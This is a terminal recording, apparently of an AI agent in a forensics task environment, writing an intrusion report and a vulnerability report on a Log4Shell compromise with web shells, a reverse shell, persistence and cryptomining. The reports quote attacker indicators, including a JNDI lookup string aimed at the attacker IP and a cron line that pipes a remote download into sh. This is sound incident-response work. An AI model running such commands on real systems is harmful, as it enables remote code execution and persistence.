[152.535267, "i", "python3 -c '\ncontent = \"\"\"# Intrusion Investigation Report\n\n## Executive Summary\nAn external threat actor compromised the application server `log4shell-prod-01` (`/sas/cti/advisory.txt:5`) by exploiting a Log4Shell (CVE-2021-44228) vulnerability in the application configuration (`/disk/opt/app/log4j2.xml:3`, `/sas/vulns.json:3`). Following initial exploitation, the adversary established persistence via dual web shells (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`), initiated an interactive reverse shell process (`/disk/tmp/.sysd:2`), and established dual persistence mechanisms through both systemd (`/disk/etc/systemd/system/apache-cache.service:6`) and cron (`/disk/etc/cron.d/apache-cache:7`). Timestomping and file wiping were employed to obfuscate on-disk artifacts (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/disk/var/lib/.cache/.wiped.bin:2`).\n\n## Threat Actor Entities & Infrastructure\n- **Origin IP**: `198.51.100.136` (`/sas/cti/advisory.txt:6`, `/disk/tmp/.sysd:2`)\n- **C2 Domain**: `update-log4shell[.]example[.]cn` (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:2`)\n- **Mining Pool Target**: `stratum+tcp://xmr[.]log4shell[.]evil:3333` (`/sas/cti/advisory.txt:23`)\n- **Crypto Wallet**: `4A000000000000000000ce1cc99945b1` (`/sas/cti/advisory.txt:24`)\n\n## Attack Chain Breakdown (MITRE ATT&CK Mapping)\n\n### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)\n- **Detail**: The attacker targeted the vulnerable Log4j2 application endpoint via JNDI injection (`${jndi:ldap://...}`).\n- **Evidence**: Log4j configuration at `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`), vulnerability mapping (`/sas/vulns.json:3`), threat intel mapping (`/sas/cti/advisory.txt:12`).\n\n### Step 2: Web Shell Deployment (T1505.003 - Web Shell)\n- **Detail**: The adversary dropped a primary JSP web shell at `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` and a secondary backup web shell at `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp`.\n- **Evidence**:\n  - Primary Web Shell: `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/sas/alerts.json:4`).\n  - Secondary Web Shell (Silent/Unalerted): `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`).\n\n### Step 3: Execution & Reverse Shell (T1059.004 - Unix Shell)\n- **Detail**: An interactive reverse shell script was dropped to `/tmp/.sysd` establishing standard bash socket redirection back to `198.51.100.136`.\n- **Evidence**: Shell script artifact at `/tmp/.sysd` (`/disk/tmp/.sysd:2`, `/sas/alerts.json:12`).\n\n### Step 4: Systemd Persistence (T1543.002 - Systemd Service)\n- **Detail**: Systemd service unit named `apache-cache.service` was configured to run on startup (`WantedBy=multi-user.target`) to re-download/execute secondary payloads.\n- **Evidence**: Unit file `/etc/systemd/system/apache-cache.service` (`/disk/etc/systemd/system/apache-cache.service:6`, `/sas/alerts.json:20`).\n\n### Step 5: Cron Persistence (T1053.003 - Cron)\n- **Detail**: A cron drop-in configuration `/etc/cron.d/apache-cache` was added to periodically execute `curl hxxp://198.51.100.136/x | sh` to maintain payload persistence.\n- **Evidence**: Cron file `/etc/cron.d/apache-cache` (`/disk/cron.d/apache-cache:7` -> `/disk/etc/cron.d/apache-cache:7`). Note: This item was silent/missing from security alerts.\n\n### Step 6: Anti-Forensics & Defense Evasion (T1070.006 - Timestomp & T1070 - Indicator Removal)\n- **Detail**:\n  - Timestomping was performed on `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` to match benign application file timestamps (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/sas/cti/advisory.txt:18`).\n  - Executable binaries were deleted/wiped, leaving partial memory/cache remnants at `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin:2`).\n\n## Impact Assessment\n- Confidentiality: High (Full Remote Code Execution achieved).\n- Integrity: High (Unauthorized web shell i"]
[152.535778, "i", "nstallation, cron jobs, systemd unit files).\n- Availability: Medium (Unauthorized resource utilization intended for XMRig mining payloads).\n\"\"\"\n\nwith open(\"/app/intrusion-report.md\", \"w\") as f:\n    f.write(content)\n'\n"]
[152.537941, "o", "python3 -c '\r\n\u001b[?2004l\r\u001b[?2004h> content = \"\"\"# Intrusion Investigation Report\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h> An external threat actor compromised the application server `log4shell-prod-01` (`/sas/cti/advisory.txt:5`) by exploiting a Log4Shell (CVE-2021-44228) vulnerability in the application configuration (`/disk/opt/app/log4j2.xml:3`, `/sas/vulns.json:3`). Following initial exploitation, the adversary established persistence via dual web shells (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`), initiated an interactive reverse shell process (`/disk/tmp/.sysd:2`), and established dual persistence mechanisms through both systemd (`/disk/etc/systemd/system/apache-cache.service:6`) and cron (`/disk/etc/cron.d/apache-cache:7`). Timestomping and file wiping were employed to obfuscate on-disk artifacts (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/disk/var/lib/.cache/.wiped.bin:2`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Threat Actor Entities & Infrastructure\r\n\u001b[?2004l\r\u001b[?2004h> - **Origin IP**: `198.51.100.136` (`/sas/cti/advisory.txt:6`, `/disk/tmp/.sysd:2`)\r\n\u001b[?2004l\r\u001b[?2004h> - **C2 Domain**: `update-log4shell[.]example[.]cn` (`/sas/cti/advisory.txt:22`, `/disk/var/lib/.cache/.wiped.bin:2`)\r\n\u001b[?2004l\r\u001b[?2004h> - **Mining Pool Target**: `stratum+tcp://xmr[.]log4shell[.]evil:3333` (`/sas/cti/advisory.txt:23`)\r\n\u001b[?2004l\r\u001b[?2004h> - **Crypto Wallet**: `4A000000000000000000ce1cc99945b1` (`/sas/cti/advisory.txt:24`)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Attack Chain Breakdown (MITRE ATT&CK Mapping)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 1: Initial Access (T1190 - Exploit Public-Facing Application)\r\n\u001b[?2004l\r\u001b[?2004h> - **Detail**: The attacker targeted the vulnerable Log4j2 application endpoint via JNDI injection (`${jndi:ldap://...}`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence**: Log4j configuration at `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`), vulnerability mapping (`/sas/vulns.json:3`), threat intel mapping (`/sas/cti/advisory.txt:12`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[152.538057, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.538253, "o", "### Step 2: Web Shell Deployment (T1505.003 - Web Shell)\r\n\u001b[?2004l\r\u001b[?2004h"]
[152.538324, "o", "> "]
[152.538486, "o", "- **Detail**: The adversary dropped a primary JSP web shell at `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` and a secondary backup web shell at `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp`.\r\n\u001b[?2004l\r"]
[152.538608, "o", "\u001b[?2004h> - **Evidence**:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.538701, "o", "  - Primary Web Shell: `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`, `/sas/alerts.json:4`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.538869, "o", "  - Secondary Web Shell (Silent/Unalerted): `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp` (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:2`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n"]
[152.538915, "o", "\u001b[?2004l\r\u001b[?2004h"]
[152.538952, "o", "> "]
[152.539727, "o", "### Step 3: Execution & Reverse Shell (T1059.004 - Unix Shell)\r\n\u001b[?2004l\r\u001b[?2004h> - **Detail**: An interactive reverse shell script was dropped to `/tmp/.sysd` establishing standard bash socket redirection back to `198.51.100.136`.\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence**: Shell script artifact at `/tmp/.sysd` (`/disk/tmp/.sysd:2`, `/sas/alerts.json:12`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 4: Systemd Persistence (T1543.002 - Systemd Service)\r\n\u001b[?2004l\r\u001b[?2004h> - **Detail**: Systemd service unit named `apache-cache.service` was configured to run on startup (`WantedBy=multi-user.target`) to re-download/execute secondary payloads.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.539852, "o", "- **Evidence**: Unit file `/etc/systemd/system/apache-cache.service` (`/disk/etc/systemd/system/apache-cache.service:6`, `/sas/alerts.json:20`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.539971, "o", "### Step 5: Cron Persistence (T1053.003 - Cron)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.54022, "o", "- **Detail**: A cron drop-in configuration `/etc/cron.d/apache-cache` was added to periodically execute `curl hxxp://198.51.100.136/x | sh` to maintain payload persistence.\r\n\u001b[?2004l\r"]
[152.540286, "o", "\u001b[?2004h> "]
[152.540541, "o", "- **Evidence**: Cron file `/etc/cron.d/apache-cache` (`/disk/cron.d/apache-cache:7` -> `/disk/etc/cron.d/apache-cache:7`). Note: This item was silent/missing from security alerts.\r\n"]
[152.540604, "o", "\u001b[?2004l\r\u001b[?2004h> \r\n"]
[152.54063, "o", "\u001b[?2004l\r"]
[152.540783, "o", "\u001b[?2004h> "]
[152.541057, "o", "### Step 6: Anti-Forensics & Defense Evasion (T1070.006 - Timestomp & T1070 - Indicator Removal)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.541095, "o", "- **Detail**:\r\n\u001b[?2004l\r\u001b[?2004h"]
[152.541342, "o", "> "]
[152.541676, "o", "  - Timestomping was performed on `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` to match benign application file timestamps (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1`, `/sas/cti/advisory.txt:18`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[152.541761, "o", "> "]
[152.541975, "o", "  - Executable binaries were deleted/wiped, leaving partial memory/cache remnants at `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin:2`)."]
[152.542021, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.54206, "o", "## Impact Assessment\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.542161, "o", "- Confidentiality: High (Full Remote Code Execution achieved).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.542271, "o", "- Integrity: High (Unauthorized web shell installation, cron jobs, systemd unit files).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.542407, "o", "- Availability: Medium (Unauthorized resource utilization intended for XMRig mining payloads).\r\n\u001b[?2004l\r\u001b[?2004h> \"\"\"\r\n\u001b[?2004l\r"]
[152.542446, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.54248, "o", "with open(\"/app/intrusion-report.md\", \"w\") as f:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.542539, "o", "    f.write(content)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[152.542607, "o", "'\r\n\u001b[?2004l\r"]
[152.550894, "o", "\u001b[?2004hroot@470dc3e3bba0:/app# "]
[166.30823, "i", "python3 -c '\ncontent = \"\"\"# Vulnerability Analysis Report\n\n## Overview & Entry Vector Analysis\nThe initial access vector into `log4shell-prod-01` (`/sas/cti/advisory.txt:5`) was a Remote Code Execution (RCE) exploitation targeting Apache Log4j2 via CVE-2021-44228 (Log4Shell) (`/sas/vulns.json:3`, `/sas/cti/advisory.txt:12`).\n\n## Vulnerability Identification: CVE-2021-44228 (Log4Shell)\n- **CVE ID**: CVE-2021-44228 (`/sas/vulns.json:3`, `/sas/cti/advisory.txt:12`)\n- **CVSS Score**: 10.0 (CRITICAL) (`/sas/cti/advisory.txt:12`)\n- **CWE Identifiers**: CWE-20, CWE-400, CWE-502, CWE-917 (`/sas/cti/advisory.txt:12`)\n- **Affected Component**: Apache Log4j2 versions 2.0-beta9 through 2.15.0 (`/sas/cti/advisory.txt:12`)\n- **Configuration File On Disk**: `/opt/app/log4j2.xml` (`/disk/opt/app/log4j2.xml:3`, `/sas/baseline.json:3`, `/sas/alerts.json:28`)\n\n## Mechanism of Exploitation\nThe application configuration at `/opt/app/log4j2.xml` had message-lookup JNDI features enabled (`/disk/opt/app/log4j2.xml:3`). When incoming user-controlled strings containing JNDI lookup expressions (e.g., `${jndi:ldap://198.51.100.136/...}`) were processed by Log4j2, the application executed an unauthenticated outbound JNDI request to the threat actor host, resulting in arbitrary Java class loading and system command execution (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`).\n\n## Evaluation of Draft / Irrelevant Vulnerability Claims\n- **CVE-2019-0708 (BlueKeep)**: The pre-filled draft change ticket (`/sas/handoff/change-ticket.md:12`) incorrectly proposed patching CVE-2019-0708 (BlueKeep) on RDP. Forensic evidence on `/disk` confirms this host is an Ubuntu Linux application server (`/disk/etc/os-release:1`), not a Windows RDP server. BlueKeep is completely irrelevant to this incident and was falsely flagged by prior shifts without evidence (`/sas/handoff/change-ticket.md:12`).\n\n## Summary of Findings\n- Verified Vulnerability: CVE-2021-44228 (`/sas/vulns.json:3`, `/disk/opt/app/log4j2.xml:3`).\n- Refuted Vulnerabilities: CVE-2019-0708 (`/sas/handoff/change-ticket.md:12`).\n\"\"\"\n\nwith open(\"/app/vuln-report.md\", \"w\") as f:\n    f.write(content)\n'\n"]
